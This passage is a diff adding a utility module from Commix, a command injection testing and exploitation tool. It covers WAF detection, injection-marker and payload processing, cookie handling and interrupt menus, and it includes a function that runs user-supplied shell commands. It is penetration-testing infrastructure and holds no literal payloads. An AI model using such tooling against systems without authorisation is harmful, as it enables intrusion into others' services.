@@ -1,0 +1,3562 @@
+#!/usr/bin/env python
+# encoding: UTF-8
+
+"""
+This file is part of Commix Project (https://commixproject.com).
+Copyright (c) 2014-2026 Anastasios Stasinopoulos (@ancst).
+
+This program is free software: you can redistribute it and/or modify
+it under the terms of the GNU General Public License as published by
+the Free Software Foundation, either version 3 of the License, or
+(at your option) any later version.
+
+For more see the file 'readme/COPYING' for copying permission.
+"""
+
+import io
+import re
+import os
+import sys
+import json
+import time
+import socket
+import random
+import string
+import base64
+import importlib
+import gzip
+import zlib
+import traceback
+import subprocess
+import contextlib
+import statistics
+from glob import glob
+from src.utils import common
+from src.utils import logs
+from src.utils import menu
+from src.utils import settings
+from src.thirdparty.odict import OrderedDict
+from src.core.convert import hexdecode
+from socket import error as SocketError
+from src.core.requests import proxy
+from src.core.requests import headers
+from src.core.requests import requests
+from src.core.requests import parameters
+from src.core.requests import stability
+from src.thirdparty.six.moves import input as _input
+from src.thirdparty.six.moves import urllib as _urllib
+from src.thirdparty.six.moves import http_client as _http_client
+from src.thirdparty.colorama import Fore, Back, Style, init
+from src.thirdparty.flatten_json.flatten_json import flatten, unflatten_list
+
+try:
+  if settings.PLATFORM == "mac":
+    import readline
+    if getattr(readline, '__doc__', '') is not None and 'libedit' in getattr(readline, '__doc__', ''):
+      import gnureadline as readline
+    from readline import *
+  else:
+    import readline
+    from readline import *
+except:
+  try:
+    import pyreadline as readline
+    from pyreadline import *
+  except:
+    settings.READLINE_ERROR = True
+
+"""
+Exiting
+"""
+def exit():
+  if settings.VERBOSITY_LEVEL != 0:
+    settings.print_data_to_stdout(settings.execution("Ending"))
+  os._exit(0)
+
+"""
+Persist a new WAF/IPS finding when possible; defer the import to avoid a circular dependency.
+"""
+def persist_waf_finding():
+  if menu.options.ignore_session or not settings.TARGET_NETLOC:
+    return
+  from src.utils import session_handler
+  session_handler.import_waf_status(settings.TARGET_NETLOC, True)
+
+"""
+Flags the target as WAF/IPS-protected on a block-like HTTP status code.
+"""
+def detect_waf(err_code):
+  if str(err_code) in settings.WAF_BLOCK_HTTP_CODES and \
+     not menu.options.skip_waf and \
+     not settings.HOST_INJECTION:
+    if not settings.WAF_ENABLED:
+      warn_msg = "It seems some kind of WAF/IPS is protecting the target."
+      settings.print_data_to_stdout(settings.print_warning_msg(warn_msg))
+      settings.WAF_ENABLED = True
+      persist_waf_finding()
+    return True
+  return False
+
+"""
+Detection of WAF/IPS protection.
+"""
+def check_waf(url, http_request_method):
+  payload = _urllib.parse.quote(settings.WAF_CHECK_PAYLOAD)
+  info_msg = "Checking whether some kind of WAF/IPS is protecting the target."
+  settings.print_data_to_stdout(settings.print_info_msg(info_msg))
+  if settings.VERBOSITY_LEVEL >= 1:
+    settings.print_data_to_stdout(settings.print_payload(payload))
+  payload = "".join(random.sample(string.ascii_uppercase, k=4)) + "=" + payload
+  if not "?" in url:
+    payload = "?" + payload
+  else:
+    payload = settings.POST_DATA_PARAM_DELIMITER + payload
+  url = url + payload
+  if settings.USER_DEFINED_POST_DATA:
+    request = _urllib.request.Request(remove_tags(url), remove_tags(settings.USER_DEFINED_POST_DATA).encode(), method=http_request_method)
+  else:
+    request = _urllib.request.Request(remove_tags(url), method=http_request_method)
+  headers.do_check(request)
+  return request, url
+
+"""
+Check injection technique(s) status.
+"""
+def injection_techniques_status():
+  if settings.CLASSIC_STATE != True and \
+     settings.EVAL_BASED_STATE != True and \
+     settings.TIME_BASED_STATE != True and \
+     settings.FILE_BASED_STATE != True and \
+     settings.TEMPFILE_BASED_STATE != True :
+    return False
+  else:
+    return True
+
+"""
+Check for quoted values
+"""
+def quoted_value(value):
+  return '"{}"'.format(value)
+
+"""
+Payload fixation
+"""
+def payload_fixation(payload):
+
+  payload = _urllib.parse.unquote(payload)
+  payload = _urllib.parse.quote(payload)
+  return payload
+
+"""
+Get response output
+"""
+def get_response(output):
+  request = _urllib.request.Request(output)
+  headers.do_check(request)
+  # Reuse check_http_traffic()'s result instead of sending the request again.
+  response = headers.check_http_traffic(request)
+  if response is None:
+    # Check if defined any HTTP Proxy (--proxy option).
+    if menu.options.proxy or menu.options.ignore_proxy or menu.options.tor:
+      response = proxy.use_proxy(request)
+    else:
+      response = _urllib.request.urlopen(request, timeout=settings.TIMEOUT)
+  return response
+
+"""
+Check for non custom parameters.
+"""
+def process_non_custom():
+  if settings.CUSTOM_INJECTION_MARKER and not settings.SKIP_NON_CUSTOM_PARAMS:
+    while True:
+      message = "Other non-custom parameters found."
+      message += " Do you want to process them too? [Y/n] "
+      process = common.read_input(message, default="Y", check_batch=True)
+      if process in settings.CHOICE_YES:
+        settings.CUSTOM_INJECTION_MARKER = False
+        settings.SKIP_NON_CUSTOM_PARAMS = settings.IGNORE_USER_DEFINED_POST_DATA = False
+        return 
+      elif process in settings.CHOICE_NO:
+        settings.SKIP_NON_CUSTOM_PARAMS = True
+        settings.IGNORE_USER_DEFINED_POST_DATA = False
+        return 
+      elif process in settings.CHOICE_QUIT:
+        raise SystemExit()
+      else:
+        common.invalid_option(process)
+        pass
+
+"""
+Process the defined injectable value
+"""
+def process_injectable_value(payload, data):
+  if len(settings.TESTABLE_VALUE) == 0:
+    settings.TESTABLE_VALUE = settings.SINGLE_WHITESPACE
+  # Regenerate the tag if it overlaps the testable value.
+  random_tag = settings.RANDOM_TAG
+  while random_tag in settings.TESTABLE_VALUE or settings.TESTABLE_VALUE in random_tag:
+    random_tag = ''.join(random.choice(string.ascii_uppercase + string.digits + string.ascii_lowercase) for _ in range(10))
+  _ = data.replace(settings.TESTABLE_VALUE, random_tag)
+  if settings.TESTABLE_VALUE in _.replace(settings.INJECT_TAG, ""):
+    return _.replace(settings.INJECT_TAG, "").replace(settings.TESTABLE_VALUE, payload).replace(random_tag, settings.TESTABLE_VALUE)
+  else:
+    return _.replace(random_tag + settings.INJECT_TAG, settings.INJECT_TAG).replace(settings.INJECT_TAG, payload).replace(random_tag, settings.TESTABLE_VALUE)
+
+"""
+Remove all injection tags from provided data
+"""
+def remove_tags(data):
+  if not data:
+    data = ""
+  return data.replace(settings.INJECT_TAG,"").replace(settings.CUSTOM_INJECTION_MARKER_CHAR,"").replace(settings.ASTERISK_MARKER, "").replace(settings.RANDOM_TAG, "") 
+
+"""
+Process data with custom injection marker character ('*')
+"""
+def process_custom_injection_data(data):
+  if not isinstance(data, str):
+    # Safely return empty string if input is not a valid string
+    return ""
+
+  if settings.CUSTOM_INJECTION_MARKER is not None:
+    lines = []
+    for line in data.split(settings.END_LINE.ESCAPED_LF):
+      if not line.startswith(settings.ACCEPT) and settings.CUSTOM_INJECTION_MARKER_CHAR in line:
+        if menu.options.test_parameter is not None and settings.CUSTOM_INJECTION_MARKER is False:
+          line = remove_tags(line)
+        line = line.replace(settings.CUSTOM_INJECTION_MARKER_CHAR, settings.ASTERISK_MARKER)
+      lines.append(line)
+    
+    # Remove duplicates, then rejoin lines
+    data = settings.END_LINE.ESCAPED_LF.join(list(dict.fromkeys(lines))).rstrip(settings.END_LINE.ESCAPED_LF)
+
+  return data
+
+"""
+Check for custom injection marker character ('*').
+"""
+def custom_injection_marker_character(url, http_request_method):
+  _ = settings.CUSTOM_INJECTION_MARKER = False
+  settings.CUSTOM_INJECTION_MARKER_PARAMETERS_LIST = []
+  
+  if url and settings.CUSTOM_INJECTION_MARKER_CHAR in url:
+    option = "'-u'"
+    _ = settings.CUSTOM_INJECTION_MARKER = settings.INJECTION_MARKER_LOCATION.URL = True
+  if menu.options.data and settings.CUSTOM_INJECTION_MARKER_CHAR in menu.options.data:
+    option = str(http_request_method) + " body"
+    _ = settings.CUSTOM_INJECTION_MARKER = settings.INJECTION_MARKER_LOCATION.DATA = True
+  if not _:
+    option = "option '--header(s)/--user-agent/--referer/--cookie'"
+  # Values like 'Accept: */*' or ';q=0.9' legitimately contain '*' - don't misread them as a marker.
+  def has_marker(value):
+    return bool(value) and settings.CUSTOM_INJECTION_MARKER_CHAR in re.sub(settings.PROBLEMATIC_CUSTOM_INJECTION_PATTERNS, "", value)
+
+  if has_marker(menu.options.cookie):
+    settings.CUSTOM_INJECTION_MARKER = settings.COOKIE_INJECTION = settings.INJECTION_MARKER_LOCATION.COOKIE = True
+  if has_marker(menu.options.agent):
+    settings.CUSTOM_INJECTION_MARKER = settings.INJECTION_MARKER_LOCATION.HTTP_HEADERS = settings.USER_AGENT_INJECTION = True
+  if has_marker(menu.options.referer):
+    settings.CUSTOM_INJECTION_MARKER = settings.INJECTION_MARKER_LOCATION.HTTP_HEADERS = settings.REFERER_INJECTION = True
+  if has_marker(menu.options.host):
+    settings.CUSTOM_INJECTION_MARKER = settings.INJECTION_MARKER_LOCATION.HTTP_HEADERS = settings.HOST_INJECTION = True
+  if has_marker(menu.options.header) or has_marker(menu.options.headers):
+     settings.CUSTOM_INJECTION_MARKER = True
+  if settings.CUSTOM_HEADER_CHECK and settings.CUSTOM_HEADER_CHECK != settings.ACCEPT:
+    if settings.CUSTOM_HEADER_CHECK not in settings.TESTABLE_PARAMETERS_LIST:
+      settings.CUSTOM_INJECTION_MARKER = True
+    else:
+      settings.CUSTOM_HEADER_INJECTION = True
+
+  if settings.CUSTOM_INJECTION_MARKER:
+    while True:
+      message = "Custom injection marker ('" + settings.CUSTOM_INJECTION_MARKER_CHAR + "') found in " + option +". "
+      message += "Do you want to process it? [Y/n] "
+      procced_option = common.read_input(message, default="Y", check_batch=True)
+      if procced_option in settings.CHOICE_YES:
+        return True
+      elif procced_option in settings.CHOICE_NO:
+        return False
+      elif procced_option in settings.CHOICE_QUIT:
+        raise SystemExit()
+      else:
+        common.invalid_option(procced_option)
+        pass
+
+"""
+Logging a debug message when a specific injection technique is being skipped.
+"""
+def skipping_technique(technique, injection_type, state):
+  if settings.VERBOSITY_LEVEL != 0 and state != True:
+    debug_msg = "Skipping test the " + "(" + injection_type.split(settings.SINGLE_WHITESPACE)[0] + ") " + technique + ". "
+    settings.print_data_to_stdout(settings.print_debug_msg(debug_msg))
+
+"""
+Skipping of further tests.
+"""
+def keep_testing_others(filename, url):
+  if not settings.LOAD_SESSION:
+    if settings.SKIP_COMMAND_INJECTIONS:
+      while True:
+        message = "Do you want to keep testing the others? [y/N] "
+        procced_option = common.read_input(message, default="N", check_batch=True)
+        if procced_option in settings.CHOICE_YES:
+          settings.SKIP_COMMAND_INJECTIONS = True
+          return
+        elif procced_option in settings.CHOICE_NO:
+          quit(filename, url, _ = False)
+        elif procced_option in settings.CHOICE_QUIT:
+          raise SystemExit()
+        else:
+          common.invalid_option(procced_option)
+          pass
+
+"""
+Skipping of further command injection tests.
+"""
+def skip_testing(filename, url):
+  if not settings.LOAD_SESSION:
+    if settings.IDENTIFIED_WARNINGS or settings.IDENTIFIED_PHPINFO:
+      _ = " testing command injection techniques"
+    else:
+      settings.SKIP_COMMAND_INJECTIONS = False 
+      settings.SKIP_CODE_INJECTIONS = True
+      _ = " further testing"
+    while True:
+      message = "Do you want to skip" + _ + " on the " 
+      message += settings.CHECKING_PARAMETER + "? (recommended if certain) [Y/n] "
+      procced_option = common.read_input(message, default="Y", check_batch=True)
+      if procced_option in settings.CHOICE_YES:
+        settings.SKIP_COMMAND_INJECTIONS = True
+        settings.LOAD_SESSION = False
+        return
+      elif procced_option in settings.CHOICE_NO:
+        settings.SKIP_COMMAND_INJECTIONS = False
+        return
+      elif procced_option in settings.CHOICE_QUIT:
+        raise SystemExit()
+      else:
+        common.invalid_option(procced_option)
+        pass
+
+"""
+Prompt the user to select a mobile User-Agent string.
+"""
+def mobile_user_agents():
+  menu.mobile_user_agents()
+
+  # Load the mobile user-agent list from file
+  mobile_agents = common.load_list_from_file(settings.MOBILE_USER_AGENT_LIST, "mobile user-agent list")
+
+  while True:
+    message = "Which smartphone do you want to imitate through HTTP User-Agent header? "
+    mobile_user_agent = common.read_input(message, default="1", check_batch=True)
+    try:
+      choice = int(mobile_user_agent)
+      if choice in range(1, len(mobile_agents) + 1):
+        return mobile_agents[choice - 1]
+      else:
+        common.invalid_option(mobile_user_agent)
+    except ValueError:
+      if mobile_user_agent.lower() == "q":
+        raise SystemExit()
+      else:
+        common.invalid_option(mobile_user_agent)
+
+
+"""
+Run host OS command(s) when injection point is found.
+"""
+def alert():
+  if settings.ALERT:
+    info_msg = "Executing alerting shell command(s) '" + str(menu.options.alert) + "'."
+    settings.print_data_to_stdout(settings.print_info_msg(info_msg))
+    try:
+      process = subprocess.Popen(menu.options.alert, shell=True)
+      process.wait()
+    except Exception as e:
+      err_msg = "Error occurred while executing command(s) '" + str(menu.options.alert) + "'."
+      settings.print_data_to_stdout(settings.print_error_msg(err_msg))
+
+"""
+Check for HTTP Method
+"""
+def check_http_method(url):
+  if settings.CRAWLING and not settings.USER_DEFINED_POST_DATA:
+    http_request_method = settings.HTTPMETHOD.GET
+  elif menu.options.method:
+    http_request_method = menu.options.method.upper()
+  elif isinstance(url, str) and settings.INJECT_TAG in url:
+    http_request_method = settings.HTTPMETHOD.GET
+  else:
+    if settings.COOKIE_INJECTION:
+      http_request_method = settings.COOKIE
+    if settings.USER_DEFINED_POST_DATA:
+      http_request_method = settings.HTTPMETHOD.POST
+    else:
+      http_request_method = settings.HTTPMETHOD.GET
+  return http_request_method
+
+"""
+Quit
+"""
+def quit(filename, url, _):
+  if settings.LOAD_SESSION:
+    logs.logs_notification(filename)
+  logs.print_logs_notification(filename, url)
+  common.show_http_error_codes()
+  if _:
+    raise exit()
+  else:
+    raise SystemExit()
+
+"""
+User aborted procedure
+"""
+def user_aborted(filename, url):
+  settings.clear_current_line()
+  abort_msg = "User aborted procedure "
+  abort_msg += "during the " + assessment_phase()
+  abort_msg += " phase (Ctrl-C pressed)."
+  settings.print_data_to_stdout(settings.print_abort_msg(abort_msg))
+  raise exit()
+
+"""
+Prompts for and applies a new verbosity level (0-4) - used by the Ctrl-C menus.
+"""
+def change_verbosity():
+  msg = "Enter new verbosity level (0-4) [current: " + str(settings.VERBOSITY_LEVEL) + "] "
+  # Ctrl-C is itself an explicit request for attention - always prompt for
+  # real input here, even under --batch.
+  choice = common.read_input(msg, default=str(settings.VERBOSITY_LEVEL), check_batch=False)
+  try:
+    level = int(choice or settings.VERBOSITY_LEVEL)
+  except ValueError:
+    level = None
+  if level is not None and 0 <= level <= 4:
+    settings.VERBOSITY_LEVEL = level
+    menu.options.verbose = level
+    info_msg = "Verbosity level set to " + str(level) + "."
+    settings.print_data_to_stdout(settings.print_info_msg(info_msg))
+  else:
+    warn_msg = "Invalid verbosity level - keeping the current value (" + str(settings.VERBOSITY_LEVEL) + ")."
+    settings.print_data_to_stdout(settings.print_warning_msg(warn_msg))
+
+"""
+Ctrl-C during detection - ask how to proceed instead of aborting outright.
+"""
+def handle_detection_interrupt(filename, url):
+  settings.clear_current_line()
+  if settings.MULTI_TARGETS:
+    msg = "How do you want to proceed? [ne(X)t target/(S)kip current technique/(e)nd detection phase/(n)ext parameter/(v)erbosity/(q)uit] "
+    default = "X"
+    valid_choices = ("x", "s", "e", "n", "v", "q")
+  else:
+    msg = "How do you want to proceed? [(S)kip current technique/(e)nd detection phase/(n)ext parameter/(v)erbosity/(q)uit] "
+    default = "S"
+    valid_choices = ("s", "e", "n", "v", "q")
+  choice = "q"
+  try:
+    while True:
+      # Ctrl-C is itself an explicit request for attention - always prompt, even under --batch.
+      choice = (common.read_input(msg, default=default, check_batch=False) or default).strip().lower()
+      if choice in valid_choices:
+        break
+      common.invalid_option(choice)
+  except KeyboardInterrupt:
+    # A second Ctrl-C here means "quit now" - don't let it escape and re-trigger this same prompt one level up.
+    settings.print_data_to_stdout(settings.END_LINE.CR)
+    choice = "q"
+  if choice == "v":
+    # No further prompting - changing verbosity redoes the current technique from the top, not skip past it.
+    change_verbosity()
+    raise settings.RetryTechniqueException()
+  elif choice == "x":
+    raise settings.NextTargetException()
+  elif choice == "e":
+    raise settings.EndDetectionPhaseException()
+  elif choice == "n":
+    raise settings.NextParameterException()
+  elif choice == "q":
+    user_aborted(filename, url)
+  else:
+    # "s" - move on to the next technique.
+    raise settings.SkipTechniqueException()
+
+"""
+Ctrl-C outside the per-test loop (heuristics, WAF check, identification) -
+too coarse to resume one specific test, so just offer to move on or quit.
+"""
+def handle_early_interrupt(filename, url):
+  if not settings.MULTI_TARGETS:
+    user_aborted(filename, url)
+  settings.clear_current_line()
+  msg = "How do you want to proceed? [ne(X)t target/(v)erbosity/(q)uit] "
+  choice = "q"
+  try:
+    while True:
+      # Ctrl-C is itself an explicit request for attention - always prompt, even under --batch.
+      choice = (common.read_input(msg, default="X", check_batch=False) or "X").strip().lower()
+      if choice in ("x", "v", "q"):
+        break
+      common.invalid_option(choice)
+  except KeyboardInterrupt:
+    # A second Ctrl-C here means "quit now" - don't let it escape and re-trigger this same prompt one level up.
+    settings.print_data_to_stdout(settings.END_LINE.CR)
+    choice = "q"
+  if choice == "v":
+    # No further prompting - changing verbosity just continues (next target).
+    change_verbosity()
+    return
+  if choice == "q":
+    user_aborted(filename, url)
+
+"""
+Ctrl-C during exploitation (shell, calibration, enumeration) - a vulnerability
+is already confirmed, so the only real choice is whether to keep going.
+"""
+def handle_exploitation_interrupt(filename, url):
+  settings.clear_current_line()
+  # "v" here, not "c" - "C" is already taken by "Continue" in this menu.
+  msg = "How do you want to proceed? [(C)ontinue/(v)erbosity/(q)uit] "
+  choice = "q"
+  try:
+    while True:
+      # Ctrl-C is itself an explicit request for attention - always prompt, even under --batch.
+      choice = (common.read_input(msg, default="C", check_batch=False) or "C").strip().lower()
+      if choice in ("c", "v", "q"):
+        break
+      common.invalid_option(choice)
+  except KeyboardInterrupt:
+    # A second Ctrl-C here means "quit now" - don't let it escape and re-trigger this same prompt one level up.
+    settings.print_data_to_stdout(settings.END_LINE.CR)
+    choice = "q"
+  if choice == "v":
+    # No further prompting - changing verbosity just continues.
+    change_verbosity()
+    return
+  if choice == "q":
+    user_aborted(filename, url)
+
+"""
+Connection exceptions
+"""
+def connection_exceptions(err_msg):
+  requests.request_failed(err_msg)
+  with settings.REQUESTS_LOCK:
+    settings.TOTAL_OF_REQUESTS = settings.TOTAL_OF_REQUESTS + 1
+  if settings.MAX_RETRIES > 1:
+    delay = stability.retry_delay_seconds()
+    if delay:
+      time.sleep(delay)
+    if not any((settings.MULTI_TARGETS, settings.CRAWLING,settings.REVERSE_TCP,settings.BIND_TCP)):
+      warn_msg = "Connection error (" + str(err_msg) + "), retrying request (" + str(settings.TOTAL_OF_REQUESTS) + "/" + str(settings.MAX_RETRIES) + ")."
+      settings.print_data_to_stdout(settings.print_warning_msg(warn_msg))
+      settings.VISIBLE_CONNECTION_ERRORS += 1
+  if not settings.VALID_URL :
+    if stability.should_abandon_target():
+      raise SystemExit()
+
+"""
+Handle server-set cookies.
+"""
+def handle_server_cookies(response):
+
+  """
+  Mask the middle part of long cookie values to avoid leaking sensitive data in prompts.
+  """
+  def mask_cookie_value(cookie_str):
+      return re.sub(
+          r"(=[^=;]{10}[^=;])[^=;]+([^=;]{10})",
+          r"\g<1>...\g<2>",
+          cookie_str
+      )
+
+  try:
+    set_cookie_header = []
+    # Compare cookie names to avoid duplicate server-set values overriding user input.
+    declared_cookies = set(c.split('=')[0].strip() for c in menu.options.cookie.split(settings.COOKIE_PARAM_DELIMITER)) if menu.options.cookie else set()
+    added_cookies = set()
+    for header, value in response.getheaders():
+      if header.lower() == settings.SET_COOKIE.lower():
+        _ = re.search(r'^\s*([^=;\s]+=[^;]*)', value)
+        if _:
+          name_value = _.group(1)
+          cookie_name = name_value.split("=")[0]
+          if cookie_name not in declared_cookies and cookie_name not in added_cookies:
+            set_cookie_header.append(name_value)
+            added_cookies.add(cookie_name)
+
+    candidate = settings.COOKIE_PARAM_DELIMITER.join(str(value) for value in set_cookie_header)
+
+    if candidate and settings.DECLARED_COOKIES is not False and settings.CRAWLING is False:
+      settings.DECLARED_COOKIES = True
+      if settings.CRAWLED_SKIPPED_URLS_NUM != 0:
+        settings.print_data_to_stdout(settings.SINGLE_WHITESPACE)
+      if menu.options.cookie:
+        user_cookies_set = set([c.split('=')[0] for c in menu.options.cookie.split(settings.COOKIE_PARAM_DELIMITER)])
+        if user_cookies_set:
+          while True:
+            message = "You declared some cookie(s), "
+            message += "but the server is setting additional ones ('"
+            message += mask_cookie_value(candidate)
+            message += "'). Do you want to merge them? [Y/n] "
+            merge_option = common.read_input(message, default="Y", check_batch=True)
+            if merge_option in settings.CHOICE_YES:
+              menu.options.cookie += settings.COOKIE_PARAM_DELIMITER + candidate
+              break
+            elif merge_option in settings.CHOICE_NO:
+              break
+            elif merge_option in settings.CHOICE_QUIT:
+              raise SystemExit()
+            else:
+              common.invalid_option(merge_option)
+              pass
+        else:
+          menu.options.cookie += settings.COOKIE_PARAM_DELIMITER + candidate
+        settings.DECLARED_COOKIES = False
+      else:
+        while True:
+          message = "You have not declared any cookie(s), "
+          message += "but the server wants to set its own ('"
+          message += mask_cookie_value(candidate)
+          message += "'). Do you want to use those? [Y/n] "
+          set_cookies = common.read_input(message, default="Y", check_batch=True)
+          if set_cookies in settings.CHOICE_YES:
+            menu.options.cookie = candidate
+            break
+          elif set_cookies in settings.CHOICE_NO:
+            settings.DECLARED_COOKIES = False
+            break
+          elif set_cookies in settings.CHOICE_QUIT:
+            raise SystemExit()
+          else:
+            common.invalid_option(set_cookies)
+            pass
+  except (AttributeError, KeyError, TypeError):
+    pass
+
+"""
+Tab Autocompleter
+"""
+def tab_autocompleter():
+  try:
+    # MacOSX tab compliter
+    if 'libedit' in readline.__doc__:
+      readline.parse_and_bind("bind ^I rl_complete")
+    else:
+      readline.parse_and_bind("tab: complete")
+    # Tab compliter
+    readline.set_completer(menu.tab_completer)
+  except (TypeError, AttributeError) as e:
+    error_msg = "Failed to initialize tab completion with the platform's readline library."
+    settings.print_data_to_stdout(settings.print_error_msg(error_msg))
+
+"""
+Load commands from history.
+"""
+def load_cmd_history():
+  try:
+    cli_history = os.path.join(os.path.expanduser("~"), settings.CLI_HISTORY)
+    if os.path.exists(cli_history):
+      readline.read_history_file(cli_history)
+  except (IOError, AttributeError, UnicodeError) as e:
+    warn_msg = "There was a problem loading the history file '" + cli_history + "'."
+    if settings.IS_WINDOWS:
+      warn_msg += " See 'https://github.com/pyreadline/pyreadline/issues/30' for more info."
+    settings.print_data_to_stdout(settings.print_warning_msg(warn_msg))
+
+"""
+Save command history.
+"""
+def save_cmd_history():
+  try:
+    cli_history = os.path.join(os.path.expanduser("~"), settings.CLI_HISTORY)
+    if os.path.exists(cli_history):
+      readline.set_history_length(settings.MAX_HISTORY_LENGTH)
+      readline.write_history_file(cli_history)
+  except (IOError, AttributeError) as e:
+    warn_msg = "Unable to write the history file '" + cli_history + "'."
+    settings.print_data_to_stdout(settings.print_warning_msg(warn_msg))
+
+"""
+Testing technique (title)
+"""
+def testing_technique_title(injection_type, technique):
+  # A new technique's title - the completion label below is free to print again for it.
+  settings.LAST_COMPLETED_TECHNIQUE = None
+  settings.LAST_DOT_BUCKET = -1
+  if settings.VERBOSITY_LEVEL != 0:
+    info_msg = "Testing the " + "(" + injection_type.split(settings.SINGLE_WHITESPACE)[0] + ") " + technique + ". "
+    settings.print_data_to_stdout(settings.print_info_msg(info_msg))
+  else:
+    # Close a previous technique's dangling "... (done)" line first.
+    settings.clear_current_line()
+    info_msg = "Testing the " + "(" + injection_type.split(settings.SINGLE_WHITESPACE)[0] + ") " + technique + ", please wait..."
+    settings.print_data_to_stdout(settings.END_LINE.CR + settings.print_info_msg(info_msg))
+
+"""
+Injection process (percent) - a "." per attempt instead of a live percentage, except for
+the terminal markers (all-tested-no-result / already-found), which still replace the line.
+"""
+def injection_process(injection_type, technique, percent):
+  if settings.VERBOSITY_LEVEL == 0:
+    # Ensure the progress label is shown before appending the prompt result.
+    if not settings.PROGRESS_LINE_OPEN:
+      testing_technique_title(injection_type, technique)
+    if "%" in str(percent):
+      # One dot per combination can get unreadably long - only cross a 4%-wide bucket.
+      match = re.search(r"([\d.]+)%", str(percent))
+      if match:
+        bucket = int(float(match.group(1)) // 4)
+        if bucket == settings.LAST_DOT_BUCKET:
+          return
+        settings.LAST_DOT_BUCKET = bucket
+      settings.print_data_to_stdout(".")
+      return
+    # Can be hit once per false-positive retry on the same technique - only print once.
+    if settings.LAST_COMPLETED_TECHNIQUE == technique:
+      return
+    settings.LAST_COMPLETED_TECHNIQUE = technique
+    settings.print_data_to_stdout(" (done)")
+    
+
+"""
+Percentage calculation
+"""
+def percentage_calculation(i, total):
+  percent = ((i*100)/total)
+  float_percent = "{0:.1f}".format(round(((i*100)/(total*1.0)),2))
+  return percent, float_percent
+
+"""
+Print percentage calculation
+"""
+def print_percentage(float_percent, no_result, shell):
+  if float(float_percent) == 100:
+    if no_result:
+      percent = settings.FAIL_STATUS
+    else:
+      percent = ".. (" + str(float_percent) + "%)"
+  elif shell:
+    percent = settings.info_msg
+  else:
+    percent = ".. (" + str(float_percent) + "%)"
+  return percent
+
+"""
+Check value inside boundaries.
+"""
+def value_inside_boundaries(parameter, http_request_method):
+  try:
+    if isinstance(parameter, str):
+      value_inside_boundaries = re.search(r"=" + settings.VALUE_BOUNDARIES, parameter).group()
+      if value_inside_boundaries:
+        pcre_mod_value = value_inside_boundaries + settings.PCRE_MODIFIER[1:2]
+        if pcre_mod_value not in parameter:
+          while True:
+            message = "It appears that provided value '" + value_inside_boundaries + "' has boundaries."
+            message += " Do you want to add the PCRE '" + settings.PCRE_MODIFIER + "'"
+            message += " modifier outside boundaries? ('" + pcre_mod_value + "') [Y/n] "
+            modifier_check = common.read_input(message, default="Y", check_batch=True)
+            if modifier_check in settings.CHOICE_YES:
+              parameter = parameter.replace(value_inside_boundaries, pcre_mod_value)
+              break
+            elif modifier_check in settings.CHOICE_NO:
+              break
+            elif modifier_check in settings.CHOICE_QUIT:
+              raise SystemExit()
+            else:
+              common.invalid_option(modifier_check)
+              pass
+
+        value = re.search(settings.VALUE_BOUNDARIES, value_inside_boundaries).group(1)
+        if value:
+          value = value_inside_boundaries.replace(value, value + settings.CUSTOM_INJECTION_MARKER_CHAR)
+          while True:
+            message = "Do you want to inject the provided value '" + value + "' inside boundaries?"
+            message += " ('" + value + "') [Y/n] "
+            procced_option = common.read_input(message, default="Y", check_batch=True)
+            if procced_option in settings.CHOICE_YES:
+              parameter = parameter.replace(value_inside_boundaries, value)
+              break
+            elif procced_option in settings.CHOICE_NO:
+              break
+            elif procced_option in settings.CHOICE_QUIT:
+              raise SystemExit()
+            else:
+              common.invalid_option(procced_option)
+              pass
+  except Exception as e:
+    pass
+
+  return parameter
+
+"""
+Ignoring the anti-CSRF parameter(s).
+"""
+def ignore_anticsrf_parameter(parameter):
+  if any(parameter.lower().count(token) for token in settings.CSRF_TOKEN_PARAMETER_INFIXES):
+    if not any(parameter for token in settings.TESTABLE_PARAMETERS_LIST):
+      if (len(parameter.split("="))) == 2:
+        info_msg = "Ignoring the parameter '" + parameter.split("=")[0]
+        info_msg += "' that appears to hold anti-CSRF token '" + parameter.split("=")[1] +  "'."
+        settings.print_data_to_stdout(settings.print_info_msg(info_msg))
+      return True
+
+"""
+Ignoring the Google analytics cookie parameter.
+"""
+def ignore_google_analytics_cookie(cookie):
+  if cookie.upper().startswith(settings.GOOGLE_ANALYTICS_COOKIE_PREFIX):
+    if (len(cookie.split("="))) == 2:
+      info_msg = "Ignoring the Google analytics cookie parameter '" + cookie.split("=")[0] + "'."
+      settings.print_data_to_stdout(settings.print_info_msg(info_msg))
+    return True
+
+"""
+Adapt newline characters in the payload depending on injection settings and OS.
+"""
+def sanitize_payload_newlines(payload):
+  if (
+    settings.USER_AGENT_INJECTION
+    or settings.REFERER_INJECTION
+    or settings.HOST_INJECTION
+    or settings.CUSTOM_HEADER_INJECTION
+  ):
+    return payload.replace(settings.END_LINE.LF, ";")
+
+  if settings.TARGET_OS != settings.OS.WINDOWS:
+    return payload.replace(settings.END_LINE.LF, "%0d")
+
+  return payload
+
+"""
+Normalize newline sequences (CRLF, CR, LF) into lowercase URL-encoded form.
+"""
+def normalize_newlines(payload):
+  payload = _urllib.parse.unquote(payload)
+
+  for seq in [settings.END_LINE.CRLF, settings.END_LINE.CR, settings.END_LINE.LF]:
+    encoded = _urllib.parse.quote(seq)
+    payload = payload.replace(seq, encoded.lower())
+    payload = payload.replace(encoded.upper(), encoded.lower())
+
+  return payload
+
+"""
+Process HTTP response content: handle decompression and encode/decode page content.
+"""
+def process_page_content(response, action):
+  try:
+    page = response.read()
+  except _http_client.IncompleteRead as err_msg:
+    requests.request_failed(err_msg)
+    page = err_msg.partial
+
+  # Handle compressed content
+  content_encoding = response.info().get('Content-Encoding')
+  if content_encoding in ("gzip", "x-gzip", "deflate"):
+    try:
+      if content_encoding == 'deflate':
+        # zlib decompression; -15 for raw deflate
+        page = zlib.decompress(page, -15)
+      else:  # gzip / x-gzip
+        with contextlib.closing(gzip.GzipFile(fileobj=io.BytesIO(page), mode='rb')) as gz:
+          page = gz.read()
+    except (zlib.error, OSError, EOFError) as e:
+      # Only catch relevant decompression errors
+      warn_msg = "Page decompression failed, turning off page compression."
+      settings.print_data_to_stdout(settings.print_warning_msg(warn_msg))
+
+  # Encode or decode page content
+  error_occurred = False
+  try:
+    if action == "encode" and isinstance(page, str):
+      return page.encode(settings.DEFAULT_CODEC, errors="replace")
+    else:
+      return page.decode(settings.DEFAULT_CODEC, errors="replace")
+  except (UnicodeEncodeError, UnicodeDecodeError) as err:
+    err_msg = "The " + str(err).split(":")[0] + ". "
+    error_occurred = True
+  except (LookupError, TypeError) as err:
+    err_msg = "The '" + settings.DEFAULT_CODEC + "' is " + str(err).split(":")[0] + ". "
+    error_occurred = True
+
+  # If there was an error, advise the user
+  if error_occurred:
